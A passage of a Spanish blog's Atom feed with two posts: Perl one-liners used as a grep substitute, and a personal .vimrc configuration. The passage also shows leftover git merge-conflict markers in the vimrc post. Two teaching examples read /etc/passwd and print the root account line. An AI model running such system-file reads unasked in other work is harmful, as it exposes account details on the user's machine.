+Mooshi Pomalus:4242 Wafer Lane:San Jose:CA:95134
+Thor Iverson:4789 Coffee Circle:Seattle:WA:981O7&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;pre&gt;&lt;code class=&quot;language-dat&quot;&gt;direcciones.txt
+Halchal Punter:1234 Disk Drive:Milpitas:ca:95035
+Mooshi Pomalus:4242 Wafer Lane:San Jose:CA:95134
+Thor Iverson:4789 Coffee Circle:Seattle:WA:981O7
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;miembros.txt
+Bruce Cockburn M5T 1A1
+Imrat Khan 400076
+Matthew Stull 98115
+Torbin Ulrich 98107&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;pre&gt;&lt;code class=&quot;language-dat&quot;&gt;miembros.txt
+Bruce Cockburn M5T 1A1
+Imrat Khan 400076
+Matthew Stull 98115
+Torbin Ulrich 98107
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;projects.txt
+area51: ET,CYA,NOYB,UFO,NSA
+glorp:  FYI,INGY,ESR 
+slurm:  URI,INGY,TFM,ESR,SRV
+yabl:   URL,SRV,INGY,ESR&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;pre&gt;&lt;code class=&quot;language-dat&quot;&gt;projects.txt
+area51: ET,CYA,NOYB,UFO,NSA
+glorp:  FYI,INGY,ESR 
+slurm:  URI,INGY,TFM,ESR,SRV
+yabl:   URL,SRV,INGY,ESR
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;algunos-ejemplos&quot;&gt;Algunos ejemplos&lt;/h2&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ perl &lt;span class=&quot;nt&quot;&gt;-wnl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/root/ and print;&apos;&lt;/span&gt; /etc/passwd
+root:x:0:0:root:/root:/usr/bin/zsh
+nm-openvpn:x:126:131:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ perl &lt;span class=&quot;nt&quot;&gt;-wnl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/ROot/i and print;&apos;&lt;/span&gt; /etc/passwd
+root:x:0:0:root:/root:/usr/bin/zsh
+nm-openvpn:x:126:131:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Imprime solo las lineas donde aparecen &apos;ESR&apos; y &apos;SRV&apos;&lt;/span&gt;
+❯ perl &lt;span class=&quot;nt&quot;&gt;-wnl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/\bESR\b/ and /\bSRV\b/ and print;&apos;&lt;/span&gt; projects.txt
+slurm:  URI,INGY,TFM,ESR,SRV
+yabl:   URL,SRV,INGY,ESR
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>spoNge</name></author><category term="Perl" /><category term="grep" /><category term="perl" /><summary type="html">Usando Perl como un grep mejorado</summary></entry><entry><title type="html">.vimrc - linux</title><link href="http://localhost:4000/vimrc/" rel="alternate" type="text/html" title=".vimrc - linux" /><published>2021-09-02T00:00:00-04:00</published><updated>2021-09-02T00:00:00-04:00</updated><id>http://localhost:4000/vimrc</id><content type="html" xml:base="http://localhost:4000/vimrc/">&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$&amp;gt;&lt;/code&gt; -&amp;gt; terminal.&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&amp;gt;&lt;/code&gt; -&amp;gt; terminal con acceso root.&lt;/p&gt;
+
+&lt;h2 id=&quot;editando-vimrc&quot;&gt;Editando .vimrc&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$&amp;gt; vim $HOME/.vimrc&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;«««&amp;lt; HEAD&lt;/p&gt;
+
+&lt;p&gt;=======&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;blockquote&gt;
+      &lt;blockquote&gt;
+        &lt;blockquote&gt;
+          &lt;blockquote&gt;
+            &lt;blockquote&gt;
+              &lt;p&gt;b9b9922 (postAD)&lt;/p&gt;
+            &lt;/blockquote&gt;
+          &lt;/blockquote&gt;
+        &lt;/blockquote&gt;
+      &lt;/blockquote&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;code-header&quot;&gt;
+    
+    
+    &lt;div class=&quot;copy-code-container&quot;&gt;
+        &lt;button class=&quot;copy-code-button&quot; aria-label=&quot;Copy code block to your clipboard&quot; data-code=&quot;colorscheme landscape
+set encoding=utf-8
+set shiftwidth=3
+set smartindent
+set ignorecase
+set autoindent
+set tabstop=3
+set mouse=a
+set showmatch
+set incsearch
+set smartcase
+set hlsearch
+set wildmenu
+set cindent
+set number
+set autoread
+set clipboard=unnamedplus
+syntax on
+
+nnoremap&amp;lt;F5&amp;gt; &amp;lt;Esc&amp;gt;:w&amp;lt;CR&amp;gt;:!chmod u+x %:p&amp;lt;enter&amp;gt;:!clear&amp;lt;enter&amp;gt;:!%:p&amp;lt;enter&amp;gt;
+nnoremap&amp;lt;C-T&amp;gt; :tabnew&amp;lt;CR&amp;gt; &amp;quot;Para que funcione debe ser tabs
+nnoremap&amp;lt;C-W&amp;gt; :tabclose&amp;lt;CR&amp;gt; &amp;quot;Osea :tabnew c.cpp
+nnoremap&amp;lt;C-Left&amp;gt; :tabprevious&amp;lt;CR&amp;gt; &amp;quot;Y funcionara
+nnoremap&amp;lt;C-Right&amp;gt; :tabnext&amp;lt;CR&amp;gt;
+nnoremap&amp;lt;Tab&amp;gt; :tabnext&amp;lt;CR&amp;gt;
+
+
+
+inoremap&amp;lt;F5&amp;gt; &amp;lt;Esc&amp;gt;:w&amp;lt;enter&amp;gt;:!chmod u+x %:p&amp;lt;enter&amp;gt;:!clear&amp;lt;enter&amp;gt;:!%:p&amp;lt;enter&amp;gt;
+inoremap ( ()&amp;lt;Esc&amp;gt;i
+inoremap ; ;&amp;lt;CR&amp;gt;
+inoremap [ []&amp;lt;Esc&amp;gt;i
+inoremap &amp;#39; &amp;#39;&amp;#39;&amp;lt;Esc&amp;gt;i
+inoremap &amp;quot; &amp;quot;&amp;quot;&amp;lt;Esc&amp;gt;i
+inoremap { {}&amp;lt;Esc&amp;gt;i
+inoremap {&amp;lt;CR&amp;gt; {&amp;lt;CR&amp;gt;}&amp;lt;Esc&amp;gt;ko
+
+let g:airline#extensions#tabline#enabled = 1
+&quot; type=&quot;button&quot;&gt;&lt;/button&gt;
+    &lt;/div&gt;
+    
+&lt;/div&gt;
+&lt;div class=&quot;language-vim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;colorscheme&lt;/span&gt; landscape
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;utf&lt;span class=&quot;m&quot;&gt;-8&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shiftwidth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;smartindent&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ignorecase&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;autoindent&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tabstop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mouse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;a&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;showmatch&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;incsearch&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;smartcase&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hlsearch&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;wildmenu&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cindent&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;number&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;autoread&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;clipboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;unnamedplus
+&lt;span class=&quot;nb&quot;&gt;syntax&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;on&lt;/span&gt;
+
+nnoremap&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;F5&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;:!&lt;/span&gt;chmod &lt;span class=&quot;k&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;x&lt;/span&gt; %&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;enter&lt;span class=&quot;p&quot;&gt;&amp;gt;:!&lt;/span&gt;clear&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;enter&lt;span class=&quot;p&quot;&gt;&amp;gt;:!&lt;/span&gt;%&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;enter&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+nnoremap&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;C&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;T&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;tabnew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &quot;Para que funcione debe ser &lt;span class=&quot;k&quot;&gt;tabs&lt;/span&gt;
+nnoremap&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;C&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;W&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;tabclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &quot;Osea &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;tabnew&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cpp&lt;/span&gt;
+nnoremap&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;C&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;Left&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;tabprevious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &quot;Y funcionara
+nnoremap&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;C&lt;span class=&quot;p&quot;&gt;-&lt;/span&gt;Right&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;tabnext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+nnoremap&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;Tab&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;tabnext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+
+
+
+inoremap&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;F5&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;enter&lt;span class=&quot;p&quot;&gt;&amp;gt;:!&lt;/span&gt;chmod &lt;span class=&quot;k&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;x&lt;/span&gt; %&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;enter&lt;span class=&quot;p&quot;&gt;&amp;gt;:!&lt;/span&gt;clear&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;enter&lt;span class=&quot;p&quot;&gt;&amp;gt;:!&lt;/span&gt;%&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;enter&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+inoremap &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;
+inoremap ; ;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
+inoremap &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;
+inoremap &lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&apos;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;
+inoremap &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;&quot;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;
+inoremap &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;i&lt;/span&gt;
+inoremap &lt;span class=&quot;p&quot;&gt;{&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&amp;lt;&lt;/span&gt;CR&lt;span class=&quot;p&quot;&gt;&amp;gt;}&amp;lt;&lt;/span&gt;Esc&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;ko
+
+&lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;g:airline&lt;/span&gt;#extensions#&lt;span class=&quot;nb&quot;&gt;tabline&lt;/span&gt;#enabled &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Gracias &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hermano&lt;/code&gt; :)&lt;/p&gt;</content><author><name>spoNge</name></author><category term="vimrc" /><category term="vim" /><summary type="html">Esta es la configuracion de vim que uso :D</summary></entry></feed>
